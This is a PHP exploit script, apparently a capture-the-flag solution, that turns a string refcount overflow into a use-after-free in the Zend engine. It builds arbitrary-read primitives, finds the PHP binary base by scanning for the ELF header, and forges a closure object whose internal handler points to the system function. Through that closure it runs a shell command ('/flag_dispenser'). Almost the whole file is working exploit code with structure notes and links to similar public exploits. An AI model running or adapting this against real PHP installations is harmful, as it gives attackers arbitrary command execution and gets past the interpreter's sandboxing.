<?php
/*
String Interning: PHP has an optimization called string interning, where certain strings are stored uniquely in memory, and any other use of the same string value will reference the same memory location. This avoids unnecessary memory duplication and speeds up string comparisons.

Interned strings are not refcounted in the traditional sense because they are permanent for the duration of the script's execution. Instead, they have a "dummy refcount" of 1.
*/
// rand to prevent string from being interned

function str2ptr(&$str, $p = 0, $s = 8) {
    $address = 0;
    for($j = $s-1; $j >= 0; $j--) {
        $address <<= 8;
        $address |= ord($str[$p+$j]);
    }
    return $address;
}

function ptr2str($ptr, $m = 8) {
    $out = "";
    for ($i=0; $i < $m; $i++) {
        $out .= chr($ptr & 0xff);
        $ptr >>= 8;
    }
    return $out;
}

function write(&$str, $p, $v, $n = 8) {
    $i = 0;
    for($i = 0; $i < $n; $i++) {
        $str[$p + $i] = chr($v & 0xff);
        $v >>= 8;
    }
}

// corrupt bucket zend_value pointer to an address we want to read
// address needs to be in a rw section since address is going to be interpreted as
// string object and hoping the values work out
function leak($addr, $p = 0, $s = 8) {
    global $original, $obj, $props_off;
    write($original, 0x68, $addr + $p - 0x10);
    $leak = strlen($obj->a);
    if($s != 8) { $leak %= 2 << ($s * 8) - 1; }
    return $leak;
}

function get_binary_base($binary_leak) {
    $base = 0;
    $start = $binary_leak & 0xfffffffffffff000;
    for($i = 0; $i < 0x1000; $i++) {
        $addr = $start - 0x1000 * $i;
        $leak = leak($addr, 0, 7);
        if($leak == 0x10102464c457f) { # ELF header
            return $addr;
        }
    }
}

function parse_elf($base) {
    $e_type = leak($base, 0x10, 2);

    $e_phoff = leak($base, 0x20);
    $e_phentsize = leak($base, 0x36, 2);
    $e_phnum = leak($base, 0x38, 2);

    for($i = 0; $i < $e_phnum; $i++) {
        $header = $base + $e_phoff + $i * $e_phentsize;
        $p_type  = leak($header, 0, 4);
        $p_flags = leak($header, 4, 4);
        $p_vaddr = leak($header, 0x10);
        $p_memsz = leak($header, 0x28);

        if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write
            # handle pie
            $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
            $data_size = $p_memsz;
        } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec
            $text_size = $p_memsz;
        }
    }

    if(!$data_addr || !$text_size || !$data_size)
        return false;

    return [$data_addr, $text_size, $data_size];
}

function get_basic_funcs($base, $elf) {
    list($data_addr, $text_size, $data_size) = $elf;
    printf("Test: 0x%x 0x%x 0x%x \n", $data_addr, $text_size, $data_size);
    for($i = 0; $i < $data_size / 8; $i++) {
        $leak = leak($data_addr + $i * 8);
        if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
            $deref = leak($leak);
            # 'constant' constant check
            if($deref != 0x746e6174736e6f63)
                continue;
        } else continue;


        $leak = leak($data_addr + ($i + 4) * 8);
        if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
            $deref = leak($leak);
            printf("second %x\n", $deref);
            # 'bin2hex' constant check
            if($deref != 0x786568326e6962)
                continue;
        } else continue;

        return $data_addr + $i * 8;
    }

    return -1;
}

class Helper {
    public $a, $b, $c, $d;
}

#$original = "vulnerable_string" . str_repeat("A", 0x20);
$original = str_repeat("A", 79);

for ($i = 0; $i < 65535; $i++) {
    $varName = "ref_" . $i;
    $$varName = $original;  // Create dynamic variable referencing $original
}
// Now, create one more reference to make the counter overflow
$anotherRef =$original;

// UAF string, corrupt it with obj of Helper class
unset($anotherRef);
$obj = new Helper();
$obj->a = "AAAAA";
$obj->b = function($x){};

/*
struct _zend_object {
	zend_refcounted_h gc; // 0x8
	uint32_t          handle; // 0x10
	zend_class_entry *ce; // 0x18
	const zend_object_handlers *handlers; // 0x20
	HashTable        *properties; // 0x28
	zval              properties_table[1]; // 0x10 per entry
};
// class with 4 static properties => size 0x68
struct _zval_struct {
	zend_value        value;
    uint32_t type_info;
    uint32_t other;
}; // 0x10
*/
// _zend_object->handlers
$closure_handlers = str2ptr($original, 0);
// 0x58 offset = 0x70
// leak the next pointer
$php_heap = str2ptr($original, 0x58);
$original_addr = $php_heap - 0xc8-0x18;
$props_off = 0x10;

printf("Original addr 0x%x \n", $original_addr);

# fake obj->a to be seen as reference (0xa)
//write($original, 0x28+0x10, $);
write($original, $props_off +0x0, $original_addr+0x78);
write($original, $props_off+ 0x8, 0xa);

/*
struct _zend_reference {
	zend_refcounted_h              gc;
	zval                           val;
	zend_property_info_source_list sources;
};
*/
# fake a _zend_reference to appear as string
// afterwards change offset 0x28*2+8 to change the string
// pointer of the reference.
// strlen(reference) will when deref the value and return val at
// offset 0x10 (length)
# fake value reference value (zen_str)
write($original, 0x60, 1); // refcount
write($original, 0x70, 6); // type of zval
//write($original, $props_off+0x28, 0x6); // gc

$closure_obj = str2ptr($original, 0x20);
$php_base = leak($closure_handlers, 8) - 0x5b17a0;
$zif_system = $php_base + 0x441bb0;

printf("corrupted len: %s \n", strlen($original));
printf("Php base: 0x%x \n", $php_base);
printf("Zif system: 0x%x\n",$zif_system);


$fake_obj_offset = 0x80;
for($i = 0; $i < 0x110; $i += 8) {
    write($original, $fake_obj_offset + $i, leak($closure_obj, $i));
}

printf("Fake object start: 0x%x \n", $original_addr+$fake_obj_offset+0x18);
# pwn
// overwrite pointer to point to fake closure obj
write($original, $props_off+0x10, $original_addr + 0x18 +$fake_obj_offset);

// change func type to ZEND_INTERNAL_FUNCTION
write($original, $fake_obj_offset + 0x38, 1, 4); # internal func type
write($original, $fake_obj_offset + 0x70, $zif_system); # internal func handler

$cmd = "id";
$cmd = "/flag_dispenser";

($obj->b)($cmd);

//echo "BREAKPOINT\n";

# zif_system = php_exec (exec.c)
/*
    PHP_FUNCTION(system)
    {
        php_exec_ex(INTERNAL_FUNCTION_PARAM_PASSTHRU, 1);
    }
*/

#$libc_base = leak($php_data+0x1a8) - 0x160290;


# +0x2572a0
# 0x54c88

/*
array buckets:
In essence, while the _zend_array struct itself contains just a single pointer to a Bucket, this pointer essentially points to an array of Bucket structures in memory. The number of buckets and their arrangement in memory is managed by the Zend Engine based on the operations you perform on the PHP array.

new element added: chunk of buckets is reallocated.

yes, exactly. When the PHP array is created or resized, a contiguous block of memory is allocated to hold the Bucket structures consecutively. The arData pointer in the _zend_array struct points to the start of this memory block.


typedef struct _zend_object_handlers zend_object_handlers;
typedef struct _zend_class_entry     zend_class_entry;
typedef union  _zend_function        zend_function;
typedef struct _zend_execute_data    zend_execute_data;

typedef struct _zval_struct     zval;

typedef struct _zend_refcounted zend_refcounted;
typedef struct _zend_string     zend_string;
typedef struct _zend_array      zend_array;
typedef struct _zend_object     zend_object;
typedef struct _zend_resource   zend_resource;
typedef struct _zend_reference  zend_reference;
typedef struct _zend_ast_ref    zend_ast_ref;
typedef struct _zend_ast        zend_ast;

packed_array
*/


//gc_collect_cycles();

// https://ssd-disclosure.com/ssd-advisory-php-spldoublylinkedlist-uaf-sandbox-escape/
// https://supergate.top/2021/02/20/d3ctf%202021/d3ctf%202021/
// https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php

?>